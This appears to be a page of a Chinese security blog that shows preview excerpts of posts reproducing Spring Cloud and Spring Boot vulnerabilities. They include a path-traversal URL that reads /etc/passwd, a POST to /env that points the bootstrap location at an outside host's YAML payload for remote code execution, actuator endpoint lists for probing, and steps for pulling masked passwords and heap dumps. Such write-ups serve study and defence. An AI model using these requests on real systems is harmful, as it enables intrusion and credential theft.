@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/41/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Spring Cloud/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5410%EF%BC%89Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.959Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-5410）Spring-Cloud-Config-目录穿越漏洞"><a href="#（CVE-2020-5410）Spring-Cloud-Config-目录穿越漏洞" class="headerlink" title="（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞"></a>（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Spring Cloud<br>Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这次补丁主要是两个部分,第一个部分是将对路径的检测方法单独的封装了出来,封装到了PathUtils类中,并且做了部分的修改,其中最主要的是检测了<code>#</code>,至于是为什么,后面来说。<img src="/resource/(CVE-2020-5410)SpringCloudConfig%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+<p>第二部分,也就是漏洞的触发入口，在environment/EnvironmentController.java中,增加了对name、label字段的检测<img src="/resource/(CVE-2020-5410)SpringCloudConfig%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png">通过补丁我们可以大概知道漏洞应该是出在EnvironmentController,但是具体怎么触发并不知道,所以我们需要跟一遍正常逻辑看一下处理流程。既然是目录穿越漏洞,我们先通过环境变量设置本地读取</p>
+<pre><code>profiles:
+    active: native
+  cloud:
+    config:
+      server:
+        native:
+          search-locations:
+            - file:/test/config-repo-master
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5410%EF%BC%89Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5410%EF%BC%89Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvmv00h2y8v1gyqt171b" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Cloud/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5405%EF%BC%89Spring%20Cloud%20Config%20Server%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.956Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-5405）Spring-Cloud-Config-Server-目录穿越漏洞"><a href="#（CVE-2020-5405）Spring-Cloud-Config-Server-目录穿越漏洞" class="headerlink" title="（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞"></a>（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Spring Cloud<br>Config为分布式系统的外部配置提供客户端的服务端的支持。使用了它，开发人员就可以在一个中心仓库管理应用程序在所有环境中的外部配置。2020-02-26<br>Spring 收到漏洞报告, Spring Cloud Config Server 存在目录穿越漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Cloud Config Server 2.2.0-2.2.1</p>
+<p>Spring Cloud Config Server 2.1.0-2.1.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>其实往前看有个替换的操作,很显眼</p>
+<p><img src="/resource/(CVE-2020-5405)SpringCloudConfigServer%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5405%EF%BC%89Spring%20Cloud%20Config%20Server%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2020-5405%EF%BC%89Spring%20Cloud%20Config%20Server%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvmv00h1y8v1437xel26" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Cloud/（CVE-2019-3799）Spring Cloud Config Server 任意文件读取 " class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.955Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-3799）Spring-Cloud-Config-Server-任意文件读取"><a href="#（CVE-2019-3799）Spring-Cloud-Config-Server-任意文件读取" class="headerlink" title="（CVE-2019-3799）Spring Cloud Config Server 任意文件读取"></a>（CVE-2019-3799）Spring Cloud Config Server 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Cloud Config 2.1.0 to 2.1.1</p>
+<p>Spring Cloud Config 2.0.0 to 2.0.3</p>
+<p>Spring Cloud Config 1.4.0 to 1.4.5</p>
+<p>其他不受支持的老版本 （如Spring Cloud Config1.3及其以下版本）</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/%EF%BC%88CVE-2019-3799%EF%BC%89Spring%20Cloud%20Config%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20/" data-id="cl5c2qvmu00h0y8v10ggj5nwe" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Cloud/Spring Cloud SnakeYAML RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.952Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Cloud-SnakeYAML-RCE"><a href="#Spring-Cloud-SnakeYAML-RCE" class="headerlink" title="Spring Cloud SnakeYAML RCE"></a>Spring Cloud SnakeYAML RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在<br>  <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>  目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
+<li>  目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><ol>
+<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL<br> 地址</li>
+<li> refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml<br> 内容时会完成指定的动作</li>
+<li> 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory<br> 接口的类并实例化</li>
+<li> 实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Cloud/Spring%20Cloud%20SnakeYAML%20RCE/" data-id="cl5c2qvmu00gzy8v15efxcva6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot 配置不当而暴露的路由" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.821Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-配置不当而暴露的路由"><a href="#Spring-Boot-配置不当而暴露的路由" class="headerlink" title="Spring Boot 配置不当而暴露的路由"></a>Spring Boot 配置不当而暴露的路由</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="路由知识"><a href="#路由知识" class="headerlink" title="路由知识"></a>路由知识</h3><ul>
+<li>Spring Boot 1.x 版本默认内置路由的根路径以 <code>/</code> 开始，2.x 则统一以<br>  <code>/actuator</code> 开始</li>
+<li>有些程序员会自定义 <code>/manage</code>、<code>/management</code> 或 <strong>项目相关名称</strong><br>  为根路径</li>
+<li>默认内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，如修改成<br>  <code>/appenv</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>trace
+health
+loggers
+metrics
+autoconfig
+heapdump
+threaddump
+env
+info
+dump
+configprops
+mappings
+auditevents
+beans
+jolokia
+cloudfoundryapplication
+hystrix.stream
+actuator
+actuator/auditevents
+actuator/beans
+actuator/health
+actuator/conditions
+actuator/configprops
+actuator/env
+actuator/info
+actuator/loggers
+actuator/heapdump
+actuator/threaddump
+actuator/metrics
+actuator/scheduledtasks
+actuator/httptrace
+actuator/mappings
+actuator/jolokia
+actuator/hystrix.stream
+</code></pre>
+<p>其中对寻找漏洞比较重要接口的有：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1/" data-id="cl5c2qvms00gvy8v16gw769mk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot 路由地址及接口调用详情泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.820Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-路由地址及接口调用详情泄漏"><a href="#Spring-Boot-路由地址及接口调用详情泄漏" class="headerlink" title="Spring Boot 路由地址及接口调用详情泄漏"></a>Spring Boot 路由地址及接口调用详情泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>直接访问以下几个路由，验证漏洞是否存在：</p>
+<pre><code>/api-docs
+/v2/api-docs
+/swagger-ui.html
+</code></pre>
+<p>一些可能会遇到的接口路由变形：</p>
+<pre><code>/api.html
+/sw/swagger-ui.html
+/api/swagger-ui.html
+/template/swagger-ui.html
+/spring-security-rest/api/swagger-ui.html
+/spring-security-oauth-resource/swagger-ui.html
+</code></pre>
+<p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F/" data-id="cl5c2qvms00guy8v11vfkea3t" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot 获取被星号脱敏的密码的明文" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.817Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="获取被星号脱敏的密码的明文-方法一"><a href="#获取被星号脱敏的密码的明文-方法一" class="headerlink" title="获取被星号脱敏的密码的明文 (方法一)"></a>获取被星号脱敏的密码的明文 (方法一)</h2><blockquote>
+<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如<br>password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>  目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code><br>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code><br>替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的<br><code>value</code> 键中。</p>
+<ul>
+<li>  调用 <code>org.springframework.boot</code> Mbean（<strong>可能更通用</strong>）</li>
+</ul>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87/" data-id="cl5c2qvms00gty8v19estd1q1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot 提取内存密码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.814Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-提取内存密码"><a href="#Spring-Boot-提取内存密码" class="headerlink" title="Spring Boot 提取内存密码"></a>Spring Boot 提取内存密码</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><blockquote>
+<p>访问如下路径如果有数据说明存在漏洞</p>
+</blockquote>
+<p><strong>Spring Boot 1.x版本</strong><code>http://www.0-sec.org:8090/env</code></p>
+<p><strong>Spring Boot 2.x版本</strong><code>http://www.0-sec.org:8090/actuator/env</code><img src="/resource/SpringBoot%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/media/rId24.png" alt="2.png"></p>
+<blockquote>
+<p>当发现存在未授权漏洞时，可以直接访问 <code>/actuator/heapdump</code><br>下载内存，提取密码</p>
+</blockquote>
+<p><code>http://www.0-sec.org:8090/actuator/heapdump</code></p>
+<blockquote>
+<p>heapdump文件下载完成之后可以利用Eclipse Memory Analyzer 来解析内存文件</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/" data-id="cl5c2qvms00gsy8v1c7vb1yp2" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot 修改环境属性导致的rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.812Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Spring-Boot-修改环境属性导致的rce"><a href="#Spring-Boot-修改环境属性导致的rce" class="headerlink" title="Spring Boot 修改环境属性导致的rce"></a>Spring Boot 修改环境属性导致的rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Boot 2.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>环境下载 <a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/actuator-testbed">https://github.com/ianxtianxt/actuator-testbed</a></p>
+<pre><code>POST /env HTTP/1.1
+Host: 127.0.0.1:8090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+ 
+spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
+</code></pre>
+<p>该请求修改了”<br>spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用”<br> refresh”端点。</p>
+<pre><code>POST /refresh HTTP/1.1
+Host: 127.0.0.1:8090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+</code></pre>
+<p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Boot/Spring%20Boot%20%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84rce/" data-id="cl5c2qvmr00gry8v17ztjgy9v" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Spring Boot/Spring Boot whitelabel error page SpEL rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Spring%20Boot/Spring%20Boot%20whitelabel%20error%20page%20SpEL%20rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.809Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
